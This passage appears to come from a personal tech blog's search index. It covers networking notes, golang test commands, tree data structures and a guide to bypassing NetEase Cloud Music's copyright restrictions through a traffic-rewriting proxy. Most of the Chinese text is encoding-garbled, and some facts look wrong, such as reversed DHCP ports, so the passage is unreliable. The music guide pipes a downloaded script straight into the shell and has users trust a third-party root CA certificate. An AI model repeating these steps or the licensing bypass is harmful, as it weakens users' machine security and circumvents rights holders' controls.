RIP å†…éƒ¨ç½‘å…³,UDP\n\nç»è¿‡ä¸€ä¸ªè·¯ç”±+1, è®¤ä¸ºè¶ŠçŸ­çš„è·¯ç”±å°±æ˜¯å¥½çš„è·¯ç”±, è·³æ•°å¤§äº15,è¡¨æ˜ä¸å¯è¾¾\n\nå¦‚æœè·ç¦»ä¸€æ ·, å¯ä»¥è´Ÿè½½å‡è¡¡\n\n\n\nè·¯ç”±å™¨ä»…å’Œç›¸é‚»è·¯ç”±å™¨å‘¨æœŸäº¤æ¢è·¯ç”±ä¿¡æ¯\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/3.png)\n\n\n\n##### 7.2.2 OSPF å†…éƒ¨ç½‘å…³,IP\n\nå…‹æœ RIP ç¼ºç‚¹,1989å¹´å¼€å‘å‡º\n\nè·¯ç”±å™¨ä¹‹é—´æœ‰ä»£ä»·, é‡‡ç”¨æœ€çŸ­è·¯å¾„ç®—æ³•(è¿ªæ°æ–¯ç‰¹æ‹‰)\n\n\n\n##### 7.2.3 BGP å¤–éƒ¨ç½‘å…³,tcp\n\nåªæ˜¯èƒ½æ‰¾åˆ°åˆ°è¾¾çš„æ¯”è¾ƒå¥½è·¯ç”±, ä¸æ˜¯æœ€ä½³è·¯ç”±\n\nä¸åŒçš„ ASè‡ªæ²»ç³»ç»Ÿå‘è¨€äººå»ºç«‹ tcp è¿æ¥,äº¤æµä¿¡æ¯\n\n\n\n# 8. ipv4é¦–éƒ¨æ ¼å¼\n\nå›ºå®š20å­—èŠ‚+ 40å­—èŠ‚å¯å˜éƒ¨åˆ†\n\n### 8.1 å›ºå®š20å­—èŠ‚\n\n+ ç‰ˆæœ¬4bit + é¦–éƒ¨é•¿åº¦(4å­—èŠ‚çš„æ•´æ•°å€) 4bit +åŒºåˆ†æœåŠ¡ 8bit + æ€»é•¿åº¦(é¦–éƒ¨+æ•°æ®) 16bit \n+  æ ‡è¯† æ ‡å¿— ç‰‡åç§»   ä¸‰ä¸ªç”¨äº ipæ•°æ®æŠ¥åˆ†ç‰‡\n+ ç”Ÿå­˜æ—¶é—´TTL(ä»¥è·³æ•°å¯¹å•ä½)åè®®8bit +   åè®®8bit(1 icmp 2 igmp 6tcp 17udp 41ipv6 89 ospf) + é¦–éƒ¨æ£€éªŒå’Œ16bit(æ£€æµ‹é¦–éƒ¨æ˜¯å¦å‡ºé”™, ipv6ä¸å†æ£€éªŒ)\n+ æº IPåœ°å€  32bit\n+ ç›®çš„ IPåœ°å€ 32bit\n\n\n\n### 8.2 IPæ•°æ®æŠ¥åˆ†ç‰‡\n\nä»¥å¤ªç½‘æ•°æ®è½½è·éƒ¨åˆ†æœ€å¤§1500å­—èŠ‚çš„é™åˆ¶(MTU), IPæ•°æ®æŠ¥å¤ªå¤§çš„è¯, éœ€è¦åˆ†ç‰‡å‘é€\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/4.png)\n\n\n\n# 9. ICMPç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®\n\nå°è£…åœ¨ IP æ•°æ®æŠ¥ä¸­å‘é€, å‘æºç‚¹æŠ¥é”™  å’Œ å‘å…¶ä»–ä¸»æœºè¯¢é—®\n\n+ å·®é”™æŠ¥å‘ŠæŠ¥æ–‡\n  + ç»ˆç‚¹ä¸å¯æ‰“\n  + æºç‚¹æŠ‘åˆ¶\n  + æ—¶é—´è¶…è¿‡\n  + å‚æ•°é—®é¢˜\n  + æ”¹å˜è·¯ç”±\n\n+ è¯¢é—®æŠ¥æ–‡\n  + å›é€è¯·æ±‚å’Œå›ç­” \n    + ping å‘½ä»¤, ä¸é€šè¿‡ tcp å’Œ udp  \n    +  tracert å‘½ä»¤, ç”¨æ¥çœ‹ç»è¿‡å“ªäº›è·¯ç”±å™¨\n  + æ—¶é—´æˆ³è¯·æ±‚å’Œå›ç­”\n\n\n\n# 10. è™šæ‹Ÿä¸“ç”¨ç½‘vpnå’Œ ç½‘ç»œåœ°å€è½¬æ¢NAT\n\n### 10.1 ç§æœ‰åœ°å€\n\n+ 10.0.0.0/8\n+ 172.16.0.0/12\n+ 192.168.0.0/16\n\n### 10.2 ä¸åŒå±€åŸŸç½‘é—´çš„å‘é€\n\n+ è·¯ç”±å™¨ä¸è½¬å‘ç§æœ‰åœ°å€\n\n+ æ‰€ä»¥å¯¹å†…éƒ¨ IPæ•°æ®æŠ¥, è¿›è¡ŒåŠ å¯†, å†æ¬¡å¥—ä¸€ä¸ªé¦–éƒ¨, å†™ä¸Šå…¬ç½‘åœ°å€\n+ åˆå« IP éš§é“æŠ€æœ¯\n\n### 10.3 NAT\n\n+ è·¯ç”±å™¨ä¸Šå®‰è£… NAT è½¯ä»¶\n+ åˆ°è·¯ç”±å™¨çš„æ—¶å€™,è½¬æ¢å…¨çƒåœ°å€, è®°å½•åœ¨è·¯ç”±å™¨çš„ NATè½¬æ¢è¡¨é‡Œ\n+ NAPTè·¯ç”±å™¨, å°†ç«¯å£å·å’Œ IP åœ°å€ä¸€èµ·è½¬æ¢\n+ NAT, å¤–ç½‘ä¸èƒ½ä¸»åŠ¨å‘èµ·åˆ°å†…ç½‘çš„ä¸»æœº, å†…ç½‘ä¸»æœºä¸èƒ½å……å½“æœåŠ¡å™¨, å¦‚æœå¯ä»¥,å°±è¦ç‰¹æ®Šç©¿é€æŠ€æœ¯\n\n> # è¿è¾“å±‚\n\n# 11. è¿è¾“å±‚\n\n### 11.1 ç«¯å£å·  0-65535\n\n+ ç†ŸçŸ¥ç«¯å£å· 0-1023 ä¸ªäººä¸èƒ½ç”¨\n+ ç™»è®°ç«¯å£å· 1024-49151 ä¹Ÿå¾—IANAç™»è®°\n+ çŸ­æš‚ç«¯å£å· 49152-65535 \n\n### 11.2 å‘é€å¤ç”¨å’Œæ¥æ”¶åˆ†ç”¨\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/5.png)\n\n\n\n> # æ•°æ®é“¾è·¯å±‚\n\n# 12. æ•°æ®é“¾è·¯å±‚\n\n#### 12.1 å°è£…æˆå¸§\n\næ·»åŠ å¸§å¤´, æ·»åŠ å¸§å°¾æ¥æ ‡å¿—\n\nå¦‚æœæ•°æ®é‡Œé¢æœ‰å¸§çš„å®šç•Œæ ‡å¿—, å°±å¯¹æ•°æ®è¿›è¡Œä¸€ä¸ªè½¬ä¹‰, å¦åˆ™ä¼šè®¤ä¸ºé”™è¯¯çš„ç»“æŸä½ç½®\n\nå¸§çš„æœ€å¤§æ•°æ®é•¿åº¦æœ‰é™åˆ¶, å«åš MTU\n\n#### 12.2 å·®é”™æ£€æµ‹\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/6.png)\n\n\n\n+ å¥‡å¶æ ¡éªŒ\n  + åœ¨æ•°æ®åé¢æ·»åŠ 1ä½å¥‡å¶æ ¡éªŒä½, ä½¿1çš„ä¸ªæ•°ä¸ºå¥‡æ•°æˆ–å¶æ•°\n  + ä¸é è°±, ä¸€åŠçš„å¤±è¯¯ç‡\n\n+ CRC æ ¡éªŒ\n\n  ![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/7.png)\n\n  ![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/8.png)\n\n#### 12.3 å¯é ä¼ è¾“\n\n+ ä¸€èˆ¬é“¾è·¯å±‚åœ¨æœ‰çº¿ä»¥å¤ªç½‘ä¸å®ç°å¯é ä¼ è¾“, æ— çº¿å±€åŸŸç½‘ä¿¡å·å·®, å®ç°å¯é ä¼ è¾“\n\n+ åœæ­¢ç­‰å¾…åè®®SW\n\n  + ä¿¡é“åˆ©ç”¨ç‡ç‰¹åˆ«ä½\n\n    ![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/9.png)\n\n\n+ å›é€€ N å¸§åè®®GBN \n\n  + é€šè¿‡å‘é€çª—å£å‘é€, ç´¯è®¡ç¡®è®¤å¢å¤§æ•ˆç‡\n  + ä½†æ˜¯å‘é€5ä¸ª, ç¬¬1ä¸ªå‡ºé”™, ä¼šè¿ç´¯å‰©ä¸‹çš„4ä¸ª, é€ æˆ5ä¸ªéƒ½éœ€è¦é‡ä¼ , å·®çš„æƒ…å†µä¸‹æ•ˆç‡ä¹Ÿä¸é«˜\n  + æ¥æ”¶çª—å£åªèƒ½æ˜¯1\n\n\n+ é€‰æ‹©é‡ä¼ åè®®SR\n\n  + æ¥æ”¶çª—å£å¤§äº1, æœ‰äº†ç¼“å­˜\n  + ä¸èƒ½ç´¯è®¡ç¡®è®¤,åªèƒ½é€ä¸€ç¡®è®¤\n\n\n\n# 13 æ•°æ®é“¾è·¯å±‚åè®®\n\n#### 13.1 ç‚¹å¯¹ç‚¹åè®® PPP\n\nä¸æä¾›å¯é ä¼ è¾“æœåŠ¡\n\n\n\n> # åº”ç”¨å±‚\n\n# 20. DHCP \n\ndhcp æœåŠ¡ç«¯å£udp 68,  å®¢æˆ·ç«¯ udp 67\n\ndhcp æœåŠ¡å™¨, ä¸€èˆ¬é›†æˆåœ¨è·¯ç”±å™¨é‡Œ\n\nå®¢æˆ·é€šè¿‡ dhcp å®¢æˆ·ç«¯å‘ dhcp æœåŠ¡å™¨è¯·æ±‚, å¾—åˆ° IPç§Ÿç”¨, æ—¶é—´è¿‡äº†ä¸€åŠå,é‡æ–°å‘é€ç§Ÿç”¨è¯·æ±‚\n\nåœ¨ä½¿ç”¨çš„æ—¶å€™éœ€è¦ç”¨ arp è¯·æ±‚ç¡®å®š ip æœªè¢«å ç”¨","tags":["ç½‘ç»œ"],"categories":["ç½‘ç»œ"]},{"title":"golangæµ‹è¯•å•ä¸ªæ–‡ä»¶æˆ–å‡½æ•°","url":"%2Fp%2F401250d7.html","content":"\n### 1. æµ‹è¯•å•ä¸ªæ–‡ä»¶æˆ–å‡½æ•°\n\næµ‹è¯•ä¸€ä¸ªæ–‡ä»¶\n\n```bash\ngo test -v hello_test.go\n```\n\n\n\næµ‹è¯•ä¸€ä¸ªå‡½æ•°\n\n```bash\ngo test -v  -test.run=\"TestA\"  \n```\n\n<!-- more -->\n\næ³¨æ„åœ¨æµ‹è¯•å•ä¸ªæ–‡ä»¶æ—¶, ä¼šå‡ºç°æœªå®šä¹‰çš„æƒ…å†µ, è¿™æ˜¯å› ä¸ºå®šä¹‰åœ¨å…¶ä»–æ–‡ä»¶é‡Œ, éœ€è¦åŠ ä¸Šå®šä¹‰çš„æ–‡ä»¶.\n\n```bash\ngo test -v hello.go hello_test.go\n```\n\n\n\nè€Œæµ‹è¯•å•ä¸ªå‡½æ•°ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜, å¯ä»¥åœ¨ä¸€ä¸ªæ–‡ä»¶å†…ç”¨ç›¸åŒçš„å‰ç¼€å‘½åæµ‹è¯•å‡½æ•°, ç„¶åç”¨æ­£åˆ™è¡¨è¾¾å¼å»æµ‹è¯•.\n\nå¦‚:\n\n```bash\ngo test -v  -test.run=\"TestA*\"  \n```\n\n\n\n### 2. æµ‹è¯•è¦†ç›–ç‡\n\n```bash\ngo test -v -coverprofile=a.out -test.run=\"TestA*\" # æŠŠæµ‹è¯•ç»“æœä¿å­˜åœ¨ a.out\n\ngo tool cover -html=./a.out  # é€šè¿‡æµè§ˆå™¨æ‰“å¼€, å¯ä»¥çœ‹åˆ°è¦†ç›–ç»è¿‡çš„å‡½æ•°\n```\n\n\n\n### 3. æ€»ç»“\n\nä¸å†™å•å…ƒæµ‹è¯•çš„ä»£ç éƒ½æ˜¯è€æµæ°“.","tags":["golang"],"categories":["golang"]},{"title":"è§£é”ç½‘æ˜“äº‘éŸ³ä¹ç°è‰²æ­Œæ›²å¹¶è¯•å¬","url":"%2Fp%2F3a9129d9.html","content":"\n\n\n# 0. å‰è¨€\n\nè°ˆèµ·éŸ³ä¹è½¯ä»¶, åªé’Ÿæƒ…ç½‘æ˜“äº‘éŸ³ä¹. å¥ˆä½•ç‰ˆæƒå¤ªå°‘, æ­Œå•é‡Œå¥½å¤šéŸ³ä¹æ¶‰åŠåˆ°ç‰ˆæƒçš„é—®é¢˜æ— æ³•å¬, å³ä½¿å¼€äº†é»‘èƒ¶VIPä¹Ÿä¸è¡Œ.\n\nä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›â€œå¥‡æ·«æŠ€å·§â€æ¥å®ç°è§£é”ç°è‰²æ— ç‰ˆæƒæ­Œæ›²ï¼Œæ•ˆæœæ¯”å¼€äº†é»‘èƒ¶VIP è¿˜è¦å¼ºå¤§.\n\nå£°æ˜ï¼šæœ¬å·¥å…·åªæä¾›å¤§å®¶å…è´¹æµ‹è¯•å­¦ä¹ ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨ä½œä»»ä½•å•†ä¸šç”¨é€”ã€‚\n\n<!-- more -->\n\n# 1. é¡¹ç›®ä»‹ç»\n\nhttps://github.com/nondanee/UnblockNeteaseMusic\n\nå…¶åŸç†æ˜¯é€šè¿‡æµé‡è¿›å…¥ä»£ç†åæ¥åŒ¹é…ç½‘æ˜“é“¾æ¥è¿›è¡ŒåŠ«æŒï¼Œç„¶åå°†requestsè¯·æ±‚ä¿®æ”¹é‡æ–°å‘é€ä¸€ä¸ªæ–°çš„é“¾æ¥ï¼ˆè¿™ä¸ªé“¾æ¥å°±æ˜¯providerçš„ï¼‰ï¼Œè¯·æ±‚åˆ°éŸ³ä¹ä»¥åå†é‡æ–°å°†providerçš„responseæ”¹å†™æˆç½‘æ˜“çš„ï¼Œç„¶åè¿”å›åˆ°åº”ç”¨ï¼Œé€šä¿—çš„è¯´æ˜¯ä¿®æ”¹httpè¯·æ±‚å’Œå“åº”ã€‚\n\næ•´ä¸ªé…ç½®å‚è€ƒäº†è¿™ä¸ªé¡¹ç›®,  å”¯ä¸€ä¸è¶³çš„æ˜¯æ•™ç¨‹æ•£è½åœ¨ä»“åº“çš„å„å¤§ issue. å› ä¸ºåªå¸¸ç”¨ ios å’Œ mac çš„è®¾å¤‡,æ‰€ä»¥åªæµ‹è¯•äº†è¿™ä¸¤ä¸ªå¹³å°, ä¸Šæµ‹è¯•æ•ˆæœå›¾:\n\n![1](è§£é”ç½‘æ˜“äº‘éŸ³ä¹ç°è‰²æ­Œæ›²å¹¶è¯•å¬/2.jpg)\n\n![2](è§£é”ç½‘æ˜“äº‘éŸ³ä¹ç°è‰²æ­Œæ›²å¹¶è¯•å¬/1.jpg)\n\n\n\n\n\n# 2. å®‰è£…é…ç½®\n\næŠŠé¡¹ç›®ä¸‹è½½åˆ°äº‘æœåŠ¡å™¨ä¸Š, ç›´æ¥ node app.js å³å¯è¿è¡Œ. å› ä¸º ios å’Œ mac å¹³å°çš„ç‰¹æ®Šæ€§, éœ€è¦åŠ ä¸€äº›å‚æ•°,å‚è€ƒä¸‹é¢é…ç½®.\n\n```Â bash\ngit clone https://github.com/nondanee/UnblockNeteaseMusic\n```\n\n### 2.1 åŸŸåè§£æ\n\næˆ‘è¿™é‡Œç»™ music.liuvv.com è§£æåˆ°äº‘æœåŠ¡å™¨ip\n\n### 2.2 nginx é…ç½®\n\n1. ç”Ÿæˆè¯ä¹¦\n\nç”¨ acme.sh ç”Ÿæˆè¯ä¹¦, å‚è€ƒ: https://github.com/acmesh-official/acme.sh\n\n```bash\n# å®‰è£… acme.sh\ncurl  https://get.acme.sh | sh\nalias acme.sh=~/.acme.sh/acme.sh\n\n# ç”Ÿæˆè¯ä¹¦\nmkdir -p /etc/nginx/ssl/music/\n\nacme.sh --issue -d music.liuvv.com -w /var/www/html\n\nacme.sh --install-cert -d music.liuvv.com --key-file /etc/nginx/ssl/music/key.pem --fullchain-file /etc/nginx/ssl/music/cert.pem --reloadcmd \"service nginx force-reload\"\n```\n\n\n\n2. ç¼–è¾‘é…ç½®\n\n`vi /etc/nginx/sites-enabled/lw-music.conf`\n\n```nginx\nserver {\n  listen 443;\n  server_name music.liuvv.com; # æ”¹ä¸ºè‡ªå·±çš„åŸŸå\n\n  ssl on;\n  ssl_certificate /etc/nginx/ssl/music/cert.pem; # æ”¹ä¸ºè‡ªå·±ç”³è¯·å¾—åˆ°çš„ crt æ–‡ä»¶çš„åç§°\n  ssl_certificate_key /etc/nginx/ssl/music/key.pem; # æ”¹ä¸ºè‡ªå·±ç”³è¯·å¾—åˆ°çš„ key æ–‡ä»¶çš„åç§°\n  ssl_session_timeout 5m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;\n  ssl_prefer_server_ciphers on;\n\n  location / {\n    proxy_pass http://localhost:8080; # è½¬å‘\n  }\n}\n```\n\n3. å¯åŠ¨\n\n   ```bash\n   systemctl restart nginx # nginx -s reloadè¯ä¹¦æ— æ•ˆ\n   ```\n\n   \n\n### 2.3 systemctl é…ç½®\n\n1. å®‰è£… node\n\n    ```bash\n    apt install nodejs\n    ```\n\n\n\n2. é…ç½® service\n\n   `vi /lib/systemd/system/lw-music.service`\n\n    ```\n   [Unit]\n   Description=lw-music\n   After=network.target\n   [Service]\n   ExecStart=/usr/bin/node /opt/liuwei/UnblockNeteaseMusic/app.js -e https://music.liuvv.com -s -p 8080:8081\n   Restart=always\n   RestartSec=5\n   [Install]\n   WantedBy=default.target\n    ```\n\n   è¿™é‡Œå¯åŠ¨çš„å‚æ•°æ ¼å¼æ˜¯ node app.js -e åŸŸå -s -p  httpç«¯å£:httpsç«¯å£\n\n3. å¯åŠ¨\n\n   ```bash\n   systemctl daemon-reload\n   systemctl start lw-music.service\nsystemctl enable lw-music.service\n   ```\n\n   \n   \n\n# 3. ä½¿ç”¨\n\n### 3. ios ä½¿ç”¨\n\næ•™ç¨‹æ•£è½åœ¨è¿™ä¸ª issue  https://github.com/nondanee/UnblockNeteaseMusic/issues/65\n\n+ å»ç¾åŒº appstore, ä¸‹è½½ä¸ªå°ç«ç®­\n\n- å³ä¸Šè§’åŠ å·æ·»åŠ èŠ‚ç‚¹\n- ç±»å‹é€‰æ‹© HTTP\n- æœåŠ¡å™¨å¡«å†™ä½ çš„æœåŠ¡å™¨å…¬ç½‘ IP\n- ç«¯å£å¡«å†™ä½ å¯åŠ¨æœåŠ¡çš„ç«¯å£å·ï¼ˆé»˜è®¤ä¸º 8080ï¼‰\n- ç„¶ååº•éƒ¨æ‰¾åˆ°é…ç½® ç‚¹å‡»æœ¬åœ°æ–‡ä»¶ -> default.conf -> ç¼–è¾‘é…ç½®\n- æ·»åŠ ä¸‰æ¡è§„åˆ™ é€‰é¡¹é€‰æ‹©ä½ åˆšåˆšæ·»åŠ çš„èŠ‚ç‚¹\n  - `USER-AGENT`: `NeteaseMusic*`\n  - `DOMAIN-SUFFIX`: `163.com`\n  - `DOMAIN-SUFFIX`: `126.net`\n\n+ æ‰“å¼€ç½‘æ˜“äº‘, æœç´¢å‘¨æ°ä¼¦\n\n\n\n### 3.2 mac ä½¿ç”¨\n\nmac å› ä¸ºæœ€æ–°ç‰ˆæœ¬çš„åŸå› (æˆ‘çš„ç‰ˆæœ¬2.3.2 (832)),  éœ€è¦é€šè¿‡è‡ªç­¾è¯ä¹¦è§£å†³https è¯·æ±‚.\n\næ•™ç¨‹æ•£è½åœ¨è¿™ä¸ª issue https://github.com/nondanee/UnblockNeteaseMusic/issues/48\n\n\n\n1. å®‰è£…ä»“åº“å†…çš„ CAè¯ä¹¦åˆ°ç³»ç»Ÿé’¥åŒ™é“¾`https://github.com/nondanee/UnblockNeteaseMusic/blob/master/ca.crt`, \n\n   é’¥åŒ™ä¸²->ç™»å½•->UnblockNetease->å§‹ç»ˆä¿¡ä»». \n\n2. åœ¨ç³»ç»Ÿåå¥½è®¾ç½®é‡Œ, ç½‘ç»œ->wifi->ä»£ç†->è‡ªåŠ¨ä»£ç†é…ç½®é‡Œ, å¡«å†™ url  `http://å…¬ç½‘ip:8080/proxy.pac`\n\n3. æ‰“å¼€ç½‘æ˜“äº‘, æœç´¢å‘¨æ°ä¼¦\n\n4. å¯é€‰ä»£ç†è½¯ä»¶\n\n   åœ¨ macä¸‹, è™½ç„¶å¯ä»¥é€šè¿‡ç³»ç»Ÿåå¥½è®¾ç½®ä»£ç†è¾¾åˆ°ç›®çš„, ä½†è¿˜æ˜¯å»ºè®®èµ°ä»£ç†è½¯ä»¶.  æˆ‘ç”¨çš„æ˜¯ clashX, å…ˆä¸Š mac çš„ clashX é…ç½®\n\n   `music.yaml` æ³¨æ„ä¿®æ”¹ä¸‹é¢çš„ å…¬ç½‘ ip ä¸ºæœåŠ¡å™¨çš„\n\n```yaml\nport: 7890\nsocks-port: 7891\nallow-lan: false\nmode: Rule\nlog-level: silent\nexternal-controller: 127.0.0.1:9090\n\ndns:\n  enable: true\n  listen: 0.0.0.0:53\n  enhanced-mode: fake-ip\n  nameserver:\n   - 119.29.29.29\n   - 223.5.5.5\n\nProxy:\n- name: \"UnblockMusic\"\n  type: http\n  server: å…¬ç½‘ip\n  port: 8080\n\nProxy Group:\n- name: \"Netease Music\"\n  type: select\n  proxies: \n    - UnblockMusic\n    - DIRECT\n\nRule:\n# Unblock Netease Music\n- DOMAIN,api.iplay.163.com,Netease Music\n- DOMAIN,apm3.music.163.com,Netease Music\n- DOMAIN,apm.music.163.com,Netease Music\n- DOMAIN,interface3.music.163.com,Netease Music\n- DOMAIN,interface.music.163.com,Netease Music\n- DOMAIN,music.163.com,Netease Music\n- DOMAIN,music.126.net,Netease Music\n- DOMAIN-SUFFIX,163yun.com,Netease Music\n- DOMAIN-SUFFIX,mam.netease.com,Netease Music\n- DOMAIN-SUFFIX,hz.netease.com,Netease Music\n\n# CIDRè§„åˆ™\n- IP-CIDR,39.105.63.80/32,Netease Music\n- IP-CIDR,45.254.48.1/32,Netease Music\n- IP-CIDR,47.100.127.239/32,Netease Music\n- IP-CIDR,59.111.160.195/32,Netease Music\n- IP-CIDR,59.111.160.197/32,Netease Music\n- IP-CIDR,59.111.181.35/32,Netease Music\n- IP-CIDR,59.111.181.38/32,Netease Music\n- IP-CIDR,59.111.181.60/32,Netease Music\n- IP-CIDR,101.71.154.241/32,Netease Music\n- IP-CIDR,103.126.92.132/32,Netease Music\n- IP-CIDR,103.126.92.133/32,Netease Music\n- IP-CIDR,112.13.119.17/32,Netease Music\n- IP-CIDR,112.13.122.1/32,Netease Music\n- IP-CIDR,115.236.118.33/32,Netease Music\n- IP-CIDR,115.236.121.1/32,Netease Music\n- IP-CIDR,118.24.63.156/32,Netease Music\n- IP-CIDR,193.112.159.225/32,Netease Music\n- IP-CIDR,223.252.199.66/32,Netease Music\n- IP-CIDR,223.252.199.67/32,Netease Music\n- IP-CIDR,59.111.21.14/31,Netease Music\n- IP-CIDR,59.111.179.214/32,Netease Music\n- IP-CIDR,59.111.238.29/32,Netease Music\n\n# Advertising\n- DOMAIN,admusicpic.music.126.net,REJECT\n- DOMAIN,iadmat.nosdn.127.net,REJECT\n- DOMAIN,iadmusicmat.music.126.net,REJECT\n- DOMAIN,iadmusicmatvideo.music.126.net,REJECT\n\n# Final\n- MATCH,DIRECT\n```\n\nå¯åŠ¨è¿™ä¸ªé…ç½®å†æ‰“å¼€ç½‘æ˜“äº‘, åŠ è½½é€Ÿåº¦å°±ä¼šç‰¹åˆ«ä¸æ»‘. \n\nä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹éœ€è¦ä¸€è¾¹ç§‘å­¦ä¸Šç½‘ä¸€è¾¹å¬æ­Œ, æ‰€ä»¥åªéœ€è¦æŠŠä¸Šé¢è¿™ä¸ª Rule è§„åˆ™åˆå¹¶ä½ ç¿»å¢™çš„è§„åˆ™é‡Œå³å¯. å› ä¸ºæœ‰è§„åˆ™ä¼˜å…ˆçº§çš„é¡ºåºé—®é¢˜, éœ€è¦æŠŠä¸Šè¿° Rule é…ç½®æ”¾åˆ°è‡ªå·±çš„ Rule é…ç½®å‰é¢.\n\n\n\n### 3.3 windowsä½¿ç”¨\n\nwindows å’Œ ios ä¸é€šç”¨, å¯ä»¥å¼€å¯ä¸¤ä¸ªè¿›ç¨‹, ç›‘å¬ä¸åŒçš„ç«¯å£\n\nhttps://github.com/nondanee/UnblockNeteaseMusic/issues/478\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/nondanee/UnblockNeteaseMusic\n+ https://www.yfriend.xyz/155.html","tags":["éŸ³ä¹"],"categories":["éŸ³ä¹"]},{"title":"æ ‘çš„ä»‹ç»å’Œåˆ†ç±»","url":"%2Fp%2Fd354593e.html","content":"\n# 1. æ ‘\n\nåœ¨è‡ªç„¶ç•Œå’Œæ—¥å¸¸ç”Ÿæ´»ä¸­ï¼Œå¯ä»¥è§åˆ°å¾ˆå¤šæƒ…å½¢å¯ä»¥å½’ç»“ä¸ºæ ‘ç»“æ„ã€‚å¦‚ï¼šå®¶æ—è°±ç³»ã€è¡Œæ”¿ç®¡ç†æœºæ„ã€Windowsç£ç›˜æ–‡ä»¶ç®¡ç†ç³»ç»Ÿç­‰ã€‚\n\nè‡ªç„¶ç•Œçš„æ ‘æ˜¯æ ‘æ ¹æœä¸‹ï¼Œæå¹²å’Œå¶å­å‘ä¸Šç”Ÿé•¿ï¼Œè€Œæˆ‘ä»¬è®¨è®ºçš„æ ‘åœ¨ç”Ÿé•¿æ–¹å‘ä¸Šæ­£å¥½ä¸å…¶ç›¸åï¼Œå®ƒæ˜¯å€’é•¿çš„æ ‘ï¼Œå³æ ¹æœä¸Šï¼Œæå¹²å’Œå¶å­æœä¸‹ã€‚\n\n<!-- more -->\n\n### 1.1 å®šä¹‰\n\næ ‘ï¼ˆTreeï¼‰æ˜¯nï¼ˆnâ‰¥0ï¼‰ä¸ªç»“ç‚¹çš„æœ‰é™é›†åˆã€‚å®ƒæ»¡è¶³ï¼š\nï¼ˆ1ï¼‰ä»…æœ‰ä¸€ä¸ªç‰¹å®šçš„ç»“ç‚¹ï¼Œç§°ä¸ºæ ¹ï¼ˆrootï¼‰ç»“ç‚¹;\nï¼ˆ2ï¼‰å…¶ä½™ç»“ç‚¹åˆ†ä¸ºm(mâ‰¥0)ä¸ªäº’ä¸ç›¸äº¤çš„éç©ºæœ‰é™é›†åˆ   å…¶ä¸­æ¯ä¸ªé›†åˆè‡ªèº«åˆæ˜¯ä¸€æ£µæ ‘ï¼Œç§°ä¸ºæ ¹çš„å­æ ‘ï¼ˆsubtreeï¼‰ã€‚\n\næœ¬æ¡å³æ˜¯è¯´ï¼Œæ ‘ç»“ç‚¹ä¹‹é—´çš„è·¯å¾„ä¸èƒ½å½¢æˆå›è·¯ï¼Œå¦åˆ™ç§°ä¸ºå›¾\n\n+ ä¸ºäº†è¡¨è¿°æ–¹ä¾¿ï¼ŒæŠŠæ²¡æœ‰ç»“ç‚¹çš„æ ‘ç§°ä¸ºç©ºæ ‘ã€‚\n+ æ ‘çš„å®šä¹‰å…·æœ‰é€’å½’æ€§ï¼šå³ä¸€æ£µæ ‘æ˜¯ç”±æ ¹åŠè‹¥å¹²æ£µå­æ ‘æ„æˆçš„ï¼Œè€Œå­æ ‘åˆæ˜¯ç”±æ ¹åŠè‹¥å¹²æ£µå­æ ‘æ„æˆçš„ã€‚\n\n### 1.2 æ ‘çš„åŸºæœ¬æœ¯è¯­\n\n+ ç»“ç‚¹çš„åº¦ï¼ˆdegreeï¼‰(å°±æ˜¯ç›´æ¥çš„å­©å­æœ‰å‡ ä¸ª)\n\n  ç»“ç‚¹æ‰€æ‹¥æœ‰çš„å­æ ‘çš„ä¸ªæ•°ç§°ä¸ºè¯¥ç»“ç‚¹çš„åº¦ï¼Œè€Œæ ‘ä¸­å„ç»“ç‚¹çš„åº¦çš„æœ€å¤§å€¼ç§°ä¸ºè¯¥æ ‘çš„åº¦ã€‚\n\n  \n\n+ å¶å­ï¼ˆleafï¼‰ç»“ç‚¹å’Œåˆ†æ”¯ç»“ç‚¹  (æ²¡æœ‰å­©å­çš„èŠ‚ç‚¹å°±æ˜¯å¶å­èŠ‚ç‚¹)\n  + åº¦ä¸º0çš„ç»“ç‚¹ç§°ä¸ºå¶å­ï¼ˆç»ˆç«¯ï¼‰ç»“ç‚¹ï¼›åº¦ä¸ä¸º0çš„ç»“ç‚¹ç§°ä¸ºåˆ†æ”¯ï¼ˆéç»ˆç«¯ï¼‰ç»“ç‚¹ã€‚\n  \n  + ä¸€æ£µæ ‘é™¤äº†å¶å­ç»“ç‚¹å°±æ˜¯åˆ†æ”¯èŠ‚ç‚¹ã€‚\n  \n    \n  \n+ å­©å­ç»“ç‚¹ã€åŒäº²ç»“ç‚¹ã€å…„å¼ŸåŠå ‚å…„å¼Ÿç»“ç‚¹ \n\n  + æ ‘ä¸­ä¸€ä¸ªç»“ç‚¹çš„å­æ ‘çš„æ ¹ï¼ˆæˆ–è¯´åç»§ï¼‰ç§°ä¸ºè¯¥ç»“ç‚¹çš„å­©å­ï¼Œè¯¥ç»“ç‚¹ç§°ä¸ºå…¶å­©å­ç»“ç‚¹çš„åŒäº²ç»“ç‚¹ã€‚\n  + åŒä¸€ä¸ªåŒäº²çš„å­©å­ç»“ç‚¹äº’ç§°ä¸ºå…„å¼Ÿã€‚åŒäº²åœ¨åŒä¸€å±‚çš„ç»“ç‚¹äº’ä¸ºå ‚å…„å¼Ÿã€‚\n\n\n\n+ ç¥–å…ˆå’Œå­å­™\n  + ç¥–å…ˆæ˜¯ä»æ ¹åˆ°è¯¥æ‰€ç»åˆ†æ”¯ä¸Šçš„æ‰€æœ‰ç»“ç‚¹ã€‚åä¹‹ï¼Œä»¥æŸç»“ç‚¹ä¸ºæ ¹çš„å­æ 